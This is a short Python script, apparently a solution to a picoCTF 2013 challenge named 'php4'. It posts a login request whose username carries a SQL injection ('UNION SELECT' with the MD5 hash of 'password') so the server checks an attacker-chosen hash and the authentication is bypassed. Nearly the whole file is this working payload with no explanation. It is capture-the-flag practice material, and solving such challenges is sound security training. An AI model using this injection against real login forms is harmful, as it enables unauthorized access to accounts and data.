#!/usr/bin/env python

import requests

target = 'https://2013.picoctf.com/problems/php4/index.php'

pw_hash = '5f4dcc3b5aa765d61d8327deb882cf99'

username = "lol' UNION SELECT '5f4dcc3b5aa765d61d8327deb882cf99'#"
password = 'password'

payload = {
	'user': username,
	'pass': password,
	'debug': 1
}

r = requests.post(target, data=payload)

print r.content